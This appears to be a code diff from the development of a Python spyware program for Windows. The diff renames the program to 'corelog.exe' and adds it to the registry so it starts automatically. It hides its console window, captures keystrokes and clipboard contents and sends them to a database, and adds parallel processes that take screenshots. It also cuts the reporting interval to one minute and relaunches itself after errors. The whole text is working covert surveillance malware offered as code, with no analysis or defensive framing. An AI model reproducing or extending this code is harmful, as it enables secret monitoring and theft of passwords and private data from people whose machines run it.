@@ -19,20 +19,11 @@ import win32process
 import shutil
 # import logging
 import dbfile
-
-# def start_script():
-#     try:
-#         main_func()
-#     except:
-
-#         handle_crash()
-
-# def handle_crash():
-#     time.sleep(5)
-#     start_script()
+import screenshot
+from multiprocessing import Process
 
 
-autorun.AddToRegistry('log_file.exe')
+autorun.AddToRegistry('corelog.exe')
 
 hwnd = ctypes.windll.kernel32.GetConsoleWindow()
 if hwnd != 0:
@@ -46,10 +37,9 @@ comname = getpass.getuser()
 # print(comname)
 temp_data = pyperclip.paste()
 
-# if not os.path.exists('datafile.txt'):
-#     with open('datafile.txt', 'a') as clip:
+# if not os.path.exists(f'C:/Users/{comname}/AppData/Local/Programs/corelog/datafile.txt'):
+#     with open(f'C:/Users/{comname}/AppData/Local/Programs/corelog/datafile.txt', 'w') as clip:
 #         pass
-
 
 def clipboard_listener():
     global temp_data, clipboard_data
@@ -65,10 +55,12 @@ def clipboard_listener():
     mytimer.daemon = True
     mytimer.start()
 
+tries = 0
 
 def isdataavailable():
+    global tries
     print('in data available function... ')
-    with open('datafile.txt', 'r+') as f:
+    with open(f'C:/Users/{comname}/AppData/Local/Programs/corelog/datafile.txt', 'r+') as f:
         # print(f.read())
         data = dict(f.read())
         print(data)
@@ -77,8 +69,16 @@ def isdataavailable():
                 f.truncate()
                 print('erased data from file.')
             except:
-                isdataavailable()
+                if tries < 3:
+                    time.sleep(5)
+                    tries += 1
+                    isdataavailable()
+                else:
+                    print("can't send data")
+                    tries = 0
+                    main_func()
         else:
+            tries = 0
             print('data not available')
 
 
@@ -89,8 +89,8 @@ def main_func():
     clipboard_listener()
     print('main function started')
     global clipboard_data
-    isdataavailable()
-    SEND_REPORT_EVERY = 1800  # in seconds, 60 means 1 minute and so on
+    # isdataavailable()
+    SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
 
     class Keylogger:
         def __init__(self, interval, report_method="email"):
@@ -143,23 +143,25 @@ def main_func():
             print(f"[+] Saved {self.filename}.txt")
 
         def sendmail(self, message):
+            # isdataavailable() #todo
             global clipboard_data
             clip_data = clipboard_data
             print(f'clip_data :{clip_data}')
-            try:
-                dbfile.write_data(data={
-                    'typed_data': message,
-                    'clipboard_data': clip_data,
-                }, comname=comname)
-                clipboard_data = ''
-            except:
-                with open('datafile.txt', 'a') as f:
-                    f.write({
+            if len(message) != 0 and len(clip_data) != 0:
+                try:
+                    dbfile.write_data(data={
                         'typed_data': message,
-                        'clipboard_data': clip_data
-                    })
-                clipboard_data = ''
-                isdataavailable()
+                        'clipboard_data': clip_data,
+                    }, comname=comname)
+                    clipboard_data = ''
+                except:
+                    with open(f'C:/Users/{comname}/AppData/Local/Programs/corelog/datafile.txt', 'a') as f:
+                        f.write({
+                            'typed_data': message,
+                            'clipboard_data': clip_data
+                        })
+                    clipboard_data = ''
+                    # isdataavailable()
 
         def report(self):
             # if self.log:
@@ -195,19 +197,36 @@ def main_func():
     keylogger.start()
     # _ss_func()
 
+if __name__ == '__main__' :
+    try:
+        p1 = Process(target=main_func)
+        p1.start()
+        p2 = Process(target=screenshot.remaining_images_checker)
+        p2.start()
+        p3 = Process(target=screenshot.ss_taker)
+        p3.start()
+    except Exception as Argument:
 
-try:
-    main_func()
-except Exception as Argument:
+        # creating/opening a file
+        f = open("error.txt", "a")
 
-    # creating/opening a file
-    f = open("error.txt", "a")
+        # writing in the file
+        f.write(str(Argument))
 
-    # writing in the file
-    f.write(str(Argument))
-
-    # closing the file
-    f.close()
-    main_func()
-except:
-    main_func()
+        # closing the file
+        f.close()
+        time.sleep(10)
+        p1 = Process(target=main_func)
+        p1.start()
+        p2 = Process(target=screenshot.remaining_images_checker)
+        p2.start()
+        p3 = Process(target=screenshot.ss_taker)
+        p3.start()
+    except:
+        time.sleep(10)
+        p1 = Process(target=main_func)
+        p1.start()
+        p2 = Process(target=screenshot.remaining_images_checker)
+        p2.start()
+        p3 = Process(target=screenshot.ss_taker)
+        p3.start()
